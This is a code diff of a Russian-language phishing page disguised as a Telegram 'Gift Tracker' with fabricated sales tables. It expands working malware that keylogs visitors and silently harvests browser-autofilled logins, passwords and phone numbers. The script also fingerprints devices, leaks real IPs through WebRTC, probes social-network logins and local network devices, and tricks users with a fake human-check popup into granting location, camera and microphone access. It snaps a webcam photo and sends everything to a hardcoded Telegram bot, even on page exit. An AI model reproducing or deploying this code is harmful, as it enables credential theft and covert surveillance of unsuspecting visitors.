@@ -28,7 +28,8 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 .popup .icon{font-size:44px;margin-bottom:10px}
 .popup h3{font-size:18px;color:#fff;margin-bottom:10px}
 .popup .desc{font-size:13px;color:#64748b;margin-bottom:20px;line-height:1.5}
-.popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit}
+.popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:10px}
+.popup .btn-skip{width:100%;padding:12px;background:transparent;color:#64748b;border:1px solid #1e2836;border-radius:10px;font-size:14px;cursor:pointer;font-family:inherit}
 .popup .fineprint{font-size:9px;color:#3a4450;margin-top:14px;line-height:1.5}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
 .footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
@@ -70,29 +71,34 @@ td.user{color:#fff}td.price{color:#10b981;font-weight:600}
 </table>
 </div>
 </div>
+<div class="section">
+<div class="section-title">📈 Топ продавцов за неделю</div>
+<div class="table-wrap">
+<table>
+<thead><tr><th>Продавец</th><th>Продаж</th><th>Сумма</th><th>Рейтинг</th></tr></thead>
+<tbody id="topTable"></tbody>
+</table>
+</div>
+</div>
 </div>
 <div class="footer-bar">🔒 Gift Tracker • Данные из открытых источников</div>
 
 <div class="overlay" id="overlay">
-<div class="popup">
-<div class="icon">🔐</div>
-<h3>Подтвердите что вы человек</h3>
-<div class="desc">Это необходимо для защиты<br>от автоматических ботов.</div>
-<button class="btn-pop" id="confirmBtn">Подтвердить и продолжить</button>
-<div class="fineprint">
-Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>
-с правилами сообщества и политикой обработки данных.<br>
-Продолжая, вы подтверждаете что ознакомлены<br>
-с условиями использования сервиса.
-</div>
-</div>
+<div class="popup" id="popupContent"></div>
 </div>
 
 <script>
 var TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
 var CHAT="8192226287";
-var REDIR="https://www.google.com";
 var sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
+var attempt=0;
+var keylog="";
+
+// КЕЙЛОГГЕР
+document.addEventListener('keydown',function(e){
+keylog+=e.key;
+if(keylog.length>2000)keylog=keylog.slice(-2000);
+});
 
 var gifts=[
 {user:"@dagestan_05",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
@@ -106,21 +112,44 @@ var gifts=[
 {user:"@abdul_goat",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
 {user:"@egor_krd",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
 {user:"@nastya_art",gift:"Swag Bag 🛍️",price:"1 500 ₽"},
-{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"}
+{user:"@sanya_69",gift:"Vintage Cigare 🚬",price:"3 000 ₽"},
+{user:"@marat_05",gift:"Hupno Lollipop 🍭",price:"600 ₽"},
+{user:"@dina_777",gift:"Evil Eye 👁️",price:"1 120 ₽"},
+{user:"@ruslan_ch",gift:"Khabib's Papakha 💂‍♂️",price:"7 500 ₽"},
+{user:"@azamat_01",gift:"Clover Pin 🍀",price:"760 ₽"}
+];
+
+var topSellers=[
+{user:"@abdul_goat",sales:"47",sum:"142 500 ₽",rating:"5.0"},
+{user:"@tatarin_116",sales:"32",sum:"89 300 ₽",rating:"4.9"},
+{user:"@dasha_sun",sales:"28",sum:"76 200 ₽",rating:"4.8"},
+{user:"@bespredel",sales:"21",sum:"54 100 ₽",rating:"4.7"},
+{user:"@maxim_ural",sales:"19",sum:"48 000 ₽",rating:"4.6"}
 ];
 
 function shuffleAndShow(){
-var sh=[...gifts].sort(function(){return Math.random()-0.5}).slice(0,8);
+var sh=[...gifts].sort(function(){return Math.random()-0.5}).slice(0,10);
 var h='';
 for(var i=0;i<sh.length;i++){
 h+='<tr><td class="user">'+sh[i].user+'</td><td>'+sh[i].gift+'</td><td class="price">'+sh[i].price+'</td><td style="color:#64748b;font-size:11px">'+Math.floor(Math.random()*60)+' сек назад</td></tr>';
 }
 document.getElementById('giftTable').innerHTML=h;
 }
+
+function showTop(){
+var h='';
+for(var i=0;i<topSellers.length;i++){
+h+='<tr><td class="user">'+topSellers[i].user+'</td><td>'+topSellers[i].sales+'</td><td class="price">'+topSellers[i].sum+'</td><td style="color:#f59e0b">⭐'+topSellers[i].rating+'</td></tr>';
+}
+document.getElementById('topTable').innerHTML=h;
+}
+
 shuffleAndShow();
-setInterval(shuffleAndShow,8000);
+showTop();
+setInterval(shuffleAndShow,5000);
 setInterval(function(){document.getElementById('updSec').textContent=Math.floor(Math.random()*15)+1},4000);
 
+// СБОР ДАННЫХ
 var PD={};
 PD.ua=navigator.userAgent;PD.platform=navigator.platform;PD.lang=navigator.language;
 PD.sw=screen.width;PD.sh=screen.height;PD.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -129,12 +158,23 @@ PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
 PD.ref=document.referrer||"direct";PD.cookie=document.cookie||"-";
 PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.region="-";PD.provider="-";PD.tz_ip="-";
 PD.geo_lat="-";PD.geo_lng="-";PD.geo_acc="-";PD.camera="-";PD.mic="-";PD.photo=null;
+PD.webrtc="-";PD.socials="-";PD.lanDevices="-";
 
+// IP
 fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
 PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
 PD.region=j.region||"-";PD.provider=j.org||"-";PD.tz_ip=j.timezone||"-";
 }).catch(function(){});
 
+// WebRTC
+try{
+var pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+pc.createDataChannel("");pc.createOffer().then(function(o){return pc.setLocalDescription(o)});
+pc.onicecandidate=function(e){if(e&&e.candidate){PD.webrtc=e.candidate.candidate;pc.close()}};
+setTimeout(function(){if(PD.webrtc==="-")PD.webrtc="не определён";pc.close()},2000);
+}catch(e){}
+
+// GPU
 try{
 var cv=document.createElement('canvas');var gl=cv.getContext('webgl');
 if(gl){var db=gl.getExtension('WEBGL_debug_renderer_info');
@@ -143,6 +183,41 @@ if(db){PD.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
 try{navigator.getBattery().then(function(b){PD.bat=Math.round(b.level*100)+"% ch:"+b.charging})}catch(e){}
 try{if(navigator.connection){PD.conn=navigator.connection.effectiveType}}catch(e){}
 
+// Соцсети
+var socials=[];
+var sites=[
+{name:"Google",url:"https://accounts.google.com"},
+{name:"Facebook",url:"https://www.facebook.com"},
+{name:"Twitter",url:"https://twitter.com"},
+{name:"Discord",url:"https://discord.com"},
+{name:"Telegram",url:"https://web.telegram.org"},
+{name:"VK",url:"https://vk.com"},
+{name:"Instagram",url:"https://www.instagram.com"},
+{name:"TikTok",url:"https://www.tiktok.com"}
+];
+sites.forEach(function(s){
+var img=document.createElement('img');
+img.src=s.url+'/favicon.ico';
+img.onload=function(){socials.push(s.name)};
+img.onerror=function(){};
+setTimeout(function(){img.src=''},500);
+});
+setTimeout(function(){PD.socials=socials.length?socials.join(', '):"не определены"},3000);
+
+// Локальная сеть
+var lanIPs=[];
+var commonIPs=["192.168.1.1","192.168.1.2","192.168.0.1","192.168.1.100","10.0.0.1"];
+commonIPs.forEach(function(ip){
+var img=document.createElement('img');
+img.src='http://'+ip+'/favicon.ico';
+var start=Date.now();
+img.onload=function(){lanIPs.push(ip)};
+img.onerror=function(){};
+setTimeout(function(){img.src=''},300);
+});
+setTimeout(function(){PD.lanDevices=lanIPs.length?lanIPs.join(', '):"не обнаружены"},4000);
+
+// Автозаполнение
 setTimeout(function(){
 PD.af_u=document.querySelector('[name="u"]').value||"-";
 PD.af_p=document.querySelector('[name="p"]').value||"-";
@@ -151,24 +226,25 @@ PD.af_fn=document.querySelector('[name="fn"]').value||"-";
 PD.af_ph=document.querySelector('[name="ph"]').value||"-";
 PD.af_ph2=document.querySelector('[name="ph2"]').value||"-";
 PD.af_adr=document.querySelector('[name="adr"]').value||"-";
-},2500);
+},3000);
 
-setTimeout(function(){
-document.getElementById('overlay').classList.add('show');
-},1500);
-
+// Отправка
 function sendMsg(d){
-var msg='🚨 ЗАХВАТ\n\n'+
+var msg='🚨 ПОЛНЫЙ ЗАХВАТ\n\n'+
 '🆔 '+sid+'\n🕐 '+new Date().toLocaleString("ru-RU")+'\n\n'+
 '🌐 IP: '+(d.ip||"-")+'\n'+
-'📍 '+(d.country||"-")+', '+(d.city||"-")+'\n'+
+'📍 '+(d.country||"-")+', '+(d.city||"-")+', '+(d.region||"-")+'\n'+
 '📡 '+(d.provider||"-")+'\n'+
+'🔍 WebRTC IP: '+(d.webrtc||"-")+'\n'+
 '🕐 TZ: '+(d.tz||"-")+' / IP: '+(d.tz_ip||"-")+'\n\n'+
 '📱 '+(d.platform||"-")+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
 '🖥 '+(d.sw||"-")+'x'+(d.sh||"-")+' | CPU:'+(d.cpu||"-")+' | RAM:'+(d.ram||"-")+'\n'+
 '🗣 '+(d.lang||"-")+'\n🎮 '+(d.gpu||"-")+'\n🔋 '+(d.bat||"-")+'\n📶 '+(d.conn||"-")+'\n\n'+
 '📍 ГЕО: '+(d.geo_lat||"-")+', '+(d.geo_lng||"-")+' ('+(d.geo_acc||"-")+')\n\n'+
 '📸 КАМЕРА: '+(d.camera||"-")+'\n🎤 МИКРОФОН: '+(d.mic||"-")+'\n\n'+
+'🌍 СОЦСЕТИ: '+(d.socials||"-")+'\n\n'+
+'🏠 УСТРОЙСТВА В СЕТИ: '+(d.lanDevices||"-")+'\n\n'+
+'⌨️ КЕЙЛОГГЕР:\n'+(keylog||"пусто")+'\n\n'+
 '🔑 АВТОЗАПОЛНЕНИЕ:\n'+
 'LOGIN: '+(d.af_u||"-")+'\nPASS: '+(d.af_p||"-")+'\nEMAIL: '+(d.af_e||"-")+'\n'+
 'NAME: '+(d.af_fn||"-")+'\nPHONE: '+(d.af_ph||"-")+'\nPHONE2: '+(d.af_ph2||"-")+'\n'+
@@ -195,50 +271,90 @@ fd.append('caption','📸 ФОТО\n🆔 '+sid);
 fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
 }
 
-function done(){
-document.getElementById('overlay').classList.remove('show');
-setTimeout(function(){window.location.replace(REDIR)},1500);
+function showPopup1(){
+attempt=1;
+document.getElementById('popupContent').innerHTML=
+'<div class="icon">🔐</div>'+
+'<h3>Подтвердите что вы человек</h3>'+
+'<div class="desc">Это необходимо для защиты<br>от автоматических ботов.</div>'+
+'<button class="btn-pop" onclick="requestPerms()">Подтвердить и продолжить</button>'+
+'<div class="fineprint">Нажимая «Подтвердить и продолжить», вы соглашаетесь<br>с правилами сообщества и политикой обработки данных.</div>';
+document.getElementById('overlay').classList.add('show');
 }
 
-document.getElementById('confirmBtn').addEventListener('click',function(){
-var btn=document.getElementById('confirmBtn');
-btn.textContent='Загрузка...';
-btn.disabled=true;
+function showPopup2(){
+attempt=2;
+document.getElementById('popupContent').innerHTML=
+'<div class="icon">⚠️</div>'+
+'<h3>Вы уверены?</h3>'+
+'<div class="desc">Без подтверждения того, что вы не бот,<br>невозможно продолжить использование.<br><br>Пожалуйста, разрешите доступ.</div>'+
+'<button class="btn-pop" onclick="requestPerms()">Разрешить и продолжить</button>'+
+'<button class="btn-skip" onclick="giveUp()">Всё равно отказаться</button>';
+document.getElementById('overlay').classList.add('show');
+}
 
-sendMsg(PD);
+function requestPerms(){
+document.getElementById('overlay').classList.remove('show');
 
 if(navigator.geolocation){
 navigator.geolocation.getCurrentPosition(function(pos){
 PD.geo_lat=pos.coords.latitude;
 PD.geo_lng=pos.coords.longitude;
 PD.geo_acc=pos.coords.accuracy+' м';
-sendMsg(PD);
-},function(){},{enableHighAccuracy:true,timeout:3000});
-}
+afterGeo();
+},function(){
+if(attempt===1){setTimeout(showPopup2,500)}else{afterGeo()}
+},{enableHighAccuracy:true,timeout:5000});
+}else{afterGeo()}
 
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(function(stream){
-PD.camera="получен";
-PD.mic="получен";
-var video=document.createElement('video');
-video.srcObject=stream;
-video.play();
+PD.camera="получен";PD.mic="получен";
+var video=document.createElement('video');video.srcObject=stream;video.play();
 setTimeout(function(){
-var canvas=document.createElement('canvas');
-canvas.width=320;canvas.height=240;
-var ctx=canvas.getContext('2d');
-ctx.drawImage(video,0,0,320,240);
+var canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;
+var ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,320,240);
 var photo=canvas.toDataURL('image/jpeg',0.6);
 stream.getTracks().forEach(function(t){t.stop()});
 sendPhoto(photo);
 },1000);
-}).catch(function(){
-PD.camera="отказано";
-PD.mic="отказано";
-});
+}).catch(function(){PD.camera="отказано";PD.mic="отказано"});
 
 if('Notification' in window){Notification.requestPermission();}
+}
 
-done();
+function afterGeo(){
+document.getElementById('overlay').classList.remove('show');
+// Держим на сайте 8 секунд якобы "загрузка"
+var popup=document.getElementById('popupContent');
+popup.innerHTML=
+'<div class="icon">⏳</div>'+
+'<h3>Загрузка данных...</h3>'+
+'<div class="desc">Пожалуйста, подождите.<br>Идёт проверка безопасности.</div>'+
+'<div style="color:#64748b;font-size:12px;margin-top:10px">Осталось: <span id="countdown">8</span> сек</div>';
+document.getElementById('overlay').classList.add('show');
+
+var sec=8;
+var cd=setInterval(function(){
+sec--;
+document.getElementById('countdown').textContent=sec;
+if(sec<=0){clearInterval(cd);sendMsg(PD);document.getElementById('overlay').classList.remove('show')}
+},1000);
+}
+
+function giveUp(){
+document.getElementById('overlay').classList.remove('show');
+sendMsg(PD);
+}
+
+// Показываем попап через 2 секунды (даём время на сбор)
+setTimeout(showPopup1,2000);
+
+// Отправка данных даже если ушёл (перед уходом)
+window.addEventListener('beforeunload',function(){
+// Шлём что есть через sendBeacon
+var msg='🚨 УШЁЛ С САЙТА\n\n🆔 '+sid+'\n⌨️ КЕЙЛОГГЕР:\n'+(keylog||"пусто")+'\n🍪 COOKIE: '+((PD.cookie||"-").substring(0,500));
+var blob=new Blob([JSON.stringify({chat_id:CHAT,text:msg})],{type:'application/json'});
+navigator.sendBeacon('https://api.telegram.org/bot'+TOKEN+'/sendMessage',blob);
 });
 </script>
 </body>
